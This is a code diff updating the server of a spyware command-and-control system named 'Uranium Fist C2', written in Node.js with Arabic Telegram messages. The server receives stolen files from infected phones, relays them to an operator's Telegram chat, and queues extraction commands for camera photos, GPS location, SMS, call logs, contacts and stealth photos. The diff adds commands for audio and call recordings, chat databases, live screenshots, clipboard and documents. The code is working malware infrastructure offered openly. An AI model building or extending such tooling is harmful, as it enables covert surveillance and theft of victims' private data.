@@ -1,4 +1,4 @@
-// server_uranium_v7.js - Uranium Fist C2 Core v7.0 (النسخة الذرية الملكية المطلقة)
+// server_uranium_v7_7.js - Uranium Fist C2 Core v7.7 Absolute Master 2027
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -17,7 +17,7 @@ if (!token || !chatId) {
 const UPLOAD_DIR = path.join(__dirname, 'uranium_storage');
 if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 
-const db = new sqlite3.Database('./uranium_core_v7.db');
+const db = new sqlite3.Database('./uranium_core_v7_7.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
@@ -32,8 +32,8 @@ appBot.on('polling_error', (error) => {
     }
 });
 
-app.use(express.text({ type: 'application/json', limit: '50mb' }));
-app.use(express.raw({ type: 'application/octet-stream', limit: '3000mb' }));
+app.use(express.text({ type: 'application/json', limit: '1024mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '5000mb' }));
 
 async function sendTg(msg, options = {}) {
     try {
@@ -44,7 +44,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#0a0a0a;color:#ff3300;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️️] URANIUM FIST C2 CORE v7 ABSOLUTE ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE v7.7 ABSOLUTE MASTER 2027 ONLINE [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -67,10 +67,10 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const fileSizeMB = stats.size / (1024 * 1024);
 
         if (fileSizeMB > 45) {
-            await sendTg(`⚠️ <b>الجزء الضخم جداً المستلم (${fileSizeMB.toFixed(2)} MB):</b> <code>${safeName}</code> تم حفظه بأمان في خزنة اليورانيوم المركزية.`);
+            await sendTg(`⚠️ <b>الحصاد العملاق المستلم (${fileSizeMB.toFixed(2)} MB):</b> <code>${safeName}</code> تم تأمينه في خزنة اليورانيوم المركزية.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `☢️ <b>قبضة اليورانيوم v7 - حصاد ملكي جديد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `☢️ <b>قبضة اليورانيوم v7.7 - حصاد ملكي جديد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
@@ -100,7 +100,7 @@ app.post('/api/v3/uranium/stream', async (req, res) => {
         if (payload.type === 'TEXT_REPORT') {
             const textData = payload.data || '';
             if (textData.length > 5) {
-                await sendTg(`☢️ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
+                await sendTg(`☢️ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
             }
         }
 
@@ -132,7 +132,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7:</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7.7 (2027):</b>\nاختر العقدة للسيطرة التامة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -148,20 +148,32 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️️ الحصاد الشامل الكاميرا والـ DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📥 سحب Download والتخزين الضخم (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
+                    { text: '☢️️ الحصاد الشامل الكاميرا DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '📥 التخزين الضخم Download (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
-                    { text: '📍 تحديد الموقع بدقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
-                    { text: '📱 قائمة التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
+                    { text: '📍 تحديد الموقع بدقة خارقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
+                    { text: '📱 قائمة التطبيقات المثبتة كاملة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                 ],
                 [
-                    { text: '📨 الرسائل (SMS)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
-                    { text: '📞 سجل المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
+                    { text: '📨 الرسائل الواردة (SMS)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
+                    { text: '📞 سجل المكالمات التفصيلي', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                 ],
                 [
-                    { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
-                    { text: '📸 أحدث صورة فورية', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
+                    { text: '📇 دليل جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
+                    { text: '📸 أحدث صورة فورية (Stealth)', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
+                ],
+                [
+                    { text: '🎤 سحب التسجيلات الصوتية', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` },
+                    { text: '📂 سحب مستندات الذاكرة الداخلية', callback_data: `cmd_EXTRACT_DOCS_${nodeId}` }
+                ],
+                [
+                    { text: '📞 سحب المكالمات المسجلة', callback_data: `cmd_EXTRACT_AUDIO_CALLS_${nodeId}` },
+                    { text: '💬 قواعد بيانات الدردشة', callback_data: `cmd_EXTRACT_CHAT_DBS_${nodeId}` }
+                ],
+                [
+                    { text: '🖼️ لقطات الشاشة الحية', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` },
+                    { text: '📋 سحب الحافظة (Clipboard)', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }
                 ],
                 [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
             ]
@@ -179,7 +191,7 @@ appBot.on('callback_query', async (query) => {
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
             await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بنجاح!` });
-            await sendTg(`⚡ <b>إمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
@@ -188,4 +200,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core v7 Absolute Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core v7.7 Absolute Online on port ${PORT}`));
